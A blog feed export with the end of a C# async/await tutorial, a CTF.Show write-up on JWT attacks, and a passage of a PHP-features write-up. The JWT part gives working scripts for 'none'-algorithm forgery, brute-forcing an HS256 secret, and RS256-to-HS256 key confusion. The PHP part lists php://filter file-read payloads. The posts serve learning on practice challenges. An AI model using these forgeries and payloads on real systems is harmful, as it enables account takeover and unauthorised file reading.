Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">5000</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次的输出结果为</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">2</span> seconds later&gt;</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">7</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">3</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>从中我们看到，在 var test1 = TestData1(); 的时候，实际上程序是进入了 TestData1 的方法中，并逐语句地往下执行，如果是同步的语句就按照同步的方法来执行。TestData1()先执行等待 2 秒，继续执行下一句，直到。。遇到 async 函数的第一个 await</p>
<p>这时候就类似于开了一个新的线程，或者可以说 TestData1() 让出了他的控制权，交还给 Main()，让 Main()继续执行下一句语句，也就是 TestData2()，但是此时 TestData1() 自己还在执行，也就是说类似于分开了一个分支，TestData1()就乖乖等待着 Task.Delay(10000)完成，Main()继续跑</p>
<p>TestData2()也是像 TestData1()一样逐个执行下一句，直到遇到 await，TestData2()也让出了他的控制权，Main()继续执行下一行，此时 Main()也遇到 await 了</p>
<p>Main()就等待 test2 的结果返回，然后输出到控制台上。</p>
<h2 id="Wait-？"><a href="#Wait-？" class="headerlink" title=".Wait() ？"></a>.Wait() ？</h2><p>刚才试到 async 里面的 await，那么用.Wait()会怎样呢</p>
<p>我们仅对 TestData1()的 await 做修改，改成.Wait()看看会怎样</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">      Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">      Task.Delay(<span class="number">10000</span>).Wait();</span><br><span class="line">      Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>此时结果为</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">12</span> seconds later&gt;</span><br><span class="line">test</span><br><span class="line">&lt;...&gt;</span><br></pre></td></tr></table></figure>

<p>这时候.Wait()就相当于变成同步执行的了，它并没有遇到它想要的 await，所以它还不能把控制权交给 Main()。此时虽然说 TestData1()也等待了，但 Main()也要跟着它一起等，等到出现那个 await，Main()才能跟 TestData1()分开，不然 Main()只能看着 TestData() 结束它自己。（悲）</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>这就是我大概理解的 async 和 await 了，如果发现有错误请求大佬指正，果果很希望得到大家的指教 QwQ</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-JWT.html</url>
    <content><![CDATA[<p>JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接</p>
<p><a href="https://jwt.io/">JWT.IO</a></p>
<h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li><p>JWT 的解码与使用</p>
</li>
<li><p>JWT 无密钥情况下可任意修改前方数据</p>
<span id="more"></span></li>
</ul>
<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从 Cookie 中可获得 JWT 的数据，并放入 <a href="http://jwt.io/">jwt.io</a> 中</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled.png" alt="Untitled"></p>
<p>由 alg:None ，我们可以知道该jwt无签名算法，我们可以任意修改数据。</p>
<p>但是这里编码后的jwt不知道为什么少了个.，在下一题缺少这个.又无法正常提交</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%201.png" alt="Untitled"></p>
<p>右键查看源代码，发现有一个访问 /admin 的提示，但注意这里不应该访问 /admin而应该访问 /admin/ ，否则将会错误地跳转到 80 端口的页面导致404。</p>
<p><del>但是此题无法依照wp做出来，先跳过。。。</del></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%202.png" alt="Untitled"></p>
<p>将捕获后的auth发送至Decoder，解码后修改sub字段为admin再编码，编码后的内容去除等于号再发送至Repeater覆盖进行访问获得flag。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></p>
<p><a href="https://jwt.io/">JWT.IO</a></p>
<p><a href="https://xz.aliyun.com/t/2338"></a></p>
<h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>修改加密方式为none使其可以任意修改数据内容</li>
</ul>
<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>将cookie中的jwt交由burpsuite解码，可以看见由三部分组成，分别为 Header.Content.Key</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%203.png" alt="Untitled"></p>
<p>在此题中我们显然是没有办法直接拿到它的密钥的，但是在测试时，为了方便可以将加密方式设置为none，这样密钥设置为任何值都是可以，包括空值。</p>
<p><del>我们可以使用burpsuite来直接修改，将后面的key部分直接去除，然后再将中间段的sub将user改为admin即可</del></p>
<p>（测试了一下，发现上面这种方法并不可用）</p>
<p>我们还可以利用 Python 中的 pyjwt 库（使用 <code>pip install pyjwt</code> 来安装）来编码一段jwt串</p>
<p>从jwt中提取得到关键数据 Header <code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code>，Content <code>&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1630149052,&quot;exp&quot;:1630156252,&quot;nbf&quot;:1630149052,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;&#125;</code> 并用pycharm进行编码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630156252</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<p>编码后输出 <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE0OTA1MiwiZXhwIjoxNjMwMTU2MjUyLCJuYmYiOjE2MzAxNDkwNTIsInN1YiI6ImFkbWluIiwianRpIjoiYWViMGQ1ZDNjYjZlYjc3ODNjZmIwMDBhYTk5MDAzNGYifQ.</code></p>
<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p>
<h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>对称加密算法 HS256 密钥的爆破</li>
<li>Python strip 移除开头或结尾的字符，默认是空格或换行符</li>
</ul>
<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>根据参考资料1，可通过报错来判定key是否有效</p>
<h3 id="通过-Python-脚本-常用密码破解"><a href="#通过-Python-脚本-常用密码破解" class="headerlink" title="通过 Python 脚本 + 常用密码破解"></a>通过 Python 脚本 + 常用密码破解</h3><blockquote>
<p>1.若签名直接校验失败，则 key_ 为有效密钥；<br>2.若因数据部分预定义字段错误<br>（jwt.exceptions.ExpiredSignatureError,<br>jwt.exceptions.InvalidAudienceError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；<br>3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；<br>4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。<br>作者：littlebin404<br>链接：<a href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<p>考虑到一般人可能会使用自己的各种密码进行设置，可以用 web21 提供的字典进行测试。</p>
<p>我们可以通过下列代码进行破解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9.1FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo&quot;</span> <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;/Users/kelly/Downloads/passwords.txt&quot;</span> <span class="comment"># 密码文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip() <span class="comment"># 去除每行后面的换行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span>) <span class="comment"># 设置编码方式为 HS256</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key: &#x27;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError</span><br><span class="line">                , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">                jwt.exceptions.ImmatureSignatureError): <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError: <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%204.png" alt="Untitled"></p>
<h3 id="通过-jwt-cracker-进行破解"><a href="#通过-jwt-cracker-进行破解" class="headerlink" title="通过 jwt-cracker 进行破解"></a>通过 jwt-cracker 进行破解</h3><p>使用 BlackArch 或者 Kali 之类的，可以使用 jwt-cracker 进行全自动破解，但是速度较慢，命令为 jwt-cracker [jwt-token]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9<span class="number">.1</span>FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo</span><br></pre></td></tr></table></figure>

<p>最后run出来密钥为 123456，可使用 web346 的代码重新合成一个 jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630158425</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="comment"># 记得改这里呀</span></span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;93643f7a8de28e7dd10f940f93beb477&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>

<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/acbb936e87df">基于JWT的token弱密钥爆破</a></p>
<h1 id="其他资料"><a href="#其他资料" class="headerlink" title="其他资料"></a>其他资料</h1><p><a href="https://xz.aliyun.com/t/6776#toc-7">https://xz.aliyun.com/t/6776#toc-7</a></p>
<h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>jwt-cracker 破解的使用</li>
</ul>
<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%205.png" alt="Untitled"></p>
<p>使用 jwt-cracker 破解可得密码为 aaab</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1630167769</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;7a62ed74141fba98f405ca3fe23ebb91&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;aaab&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获得 token <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE2MDU2OSwiZXhwIjoxNjMwMTY3NzY5LCJuYmYiOjE2MzAxNjA1NjksInN1YiI6ImFkbWluIiwianRpIjoiN2E2MmVkNzQxNDFmYmE5OGY0MDVjYTNmZTIzZWJiOTEifQ.Ry2pggYXHznUje2KnM2In8Tku3RwuftuKIY3t4X3Hns</code></p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%206.png" alt="Untitled"></p>
<h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>node.js 中 Express 可通过 public 文件夹映射静态文件，从而下载</li>
</ul>
<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.cookie(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.end(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.cookies.auth;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.verify(auth, cert, <span class="function"><span class="keyword">function</span>(<span class="params">err, decoded</span>) </span>&#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.end(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.end(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>由题，我们可以得知其密钥存放于 /public/private.key，下载获得，并且编写 node.js 代码，注意需要提前安装好 jsonwebtoken 的 npm 包</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKeyPath = <span class="string">&quot;//Users//kelly//Downloads//private.key&quot;</span></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(privateKeyPath)</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123;<span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span>&#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;)</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br></pre></td></tr></table></figure>

<p>得到 token <code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxNjIwOTd9.npKuv9ByHR6GG5v6vVtpMcjBnfKvWKk2QpklGZEcdTvla_qNFxC6N8mjRTBE5pTUDtGLCthrUWI860hL0GfE6Yyj3hMhOvwP53KqXeGbcG4rwl3kslQ-q92TeeVoLgQW83-M855bEE5_dS_YQsVhJfqdaBKoh-j9gE2fX_bnqDI</code></p>
<p>同时，题目要求验证的时候使用 POST，丢到 burpsuite 里面一把梭</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%207.png" alt="Untitled"></p>
<h1 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h1><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>这题是一个白盒分析题，可以通过参数 env=development 来使其报出错误。由于压缩包里没有 private.key ，因此想要暴力破解密钥是不太可能的。同时，cookie中的auth参数提交到 index.js 后经由 jwt.verify 验证，如果 decoded 为undefined则校验失败。但经过测试，发现连它生成的jwt我直接post都没法进行到下一步，<del>所以我决定看wp</del></p>
<blockquote>
<p>通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。</p>
</blockquote>
<p>原来 JWT 在没有强制使用 RS256 的时候，还可以使用 public.key 与 HS256 来假装让它进行对称加密，真是tql。此处的public.key可以直接在网站上下载，直接输入 /public.key</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(<span class="string">&#x27;./public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token) <span class="comment">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxOTg2NDJ9.7_3UAT5LFXNiPgdZCH80sQYvek-lQ88py8pb9lY9HHw</span></span><br></pre></td></tr></table></figure>

<p>这样下来，解题就很简单了，我们用公钥签名，然后直接把jwt交上去试试</p>
<p>按照代码，我们这里还需要使用 POST 方式来进行请求</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%208.png" alt="Untitled"></p>
<h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p>
]]></content>
      <categories>
        <category>技术篇</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128</title>
    <url>/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html</url>
    <content><![CDATA[<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><p><code>PHP Version: 7.3.11</code></p>
<p>仍未解决</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>对 PHP 原生类的运用</li>
</ul>
<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，<del>顺便看一下hint</del></p>
<p>想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt，如果恰好flag的名字不在第一个怎么办？</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$b</span> = getcwd();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<p>令我更不明白的是，为什么我这里调用的是 web110.php，他给我返回了一个 web261.php？</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled.png" alt="Untitled"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.extrader.top/posts/35c0085d/">https://www.extrader.top/posts/35c0085d/</a>  php原生类利用</li>
<li><a href="https://www.php.net/manual/zh/refs.basic.other.php">https://www.php.net/manual/zh/refs.basic.other.php</a> PHP 基本扩展</li>
</ul>
<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><p><code>PHP Version: 7.3.11</code></p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
<li>变量覆盖</li>
</ul>
<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我原本想的是 v1 = ctfshow, v2 = flag 的，执行后发现为null，于是就逐个断点调试看看是什么情况。</p>
<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/screen.gif" alt="screen.gif"></p>
<p>可以看到，这个 $flag 进来以后就没了，那怎么办呢，其实 $flag 在外部已经被定义了，所以他算是一个全局变量，只要我们查看 GLOBALS 的值即可拿到 flag，也就是说 v1 写 ctfshow，v2 写 GLOBALS。</p>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p><code>PHP Version: 7.3.11</code></p>
<ul>
<li>函数绕过</li>
<li>PHP 伪协议读取文件</li>
</ul>
<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>首先可以看到，这里面过滤了 ..|http|https|data|input|rot13|base64|string ，如果没有这个，可以考虑用 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 来绕过。其他绕过方式也可参考参考资料[1]。</p>
<p>然后我们看到 is_file($file) 这里做了一层判断，也就是说不能直接读取文件，不过我们可以借此判断是否存在文件。输入 /?file=/var/www/html/flag.php 返回 hacker! 代表存在该文件。</p>
<p>根据官方提示以及参考资料[2]，我们可以通过以下几种方式获取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>

<p>前三种方式不乏都是通过 PHP 流过滤器加上各种转换（见参考资料[3]）与最终 resource=flag.php 拿到 flag，最后一种则是通过压缩流与调取本地文件拿到</p>
<p>并且看起来 read= 可以忽略，主要是看转换，更多过滤器可见参考资料 [4]</p>
<p>不过最后一种在 highlight_file 遇到以后是会自动解压吗？不是很懂</p>
<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
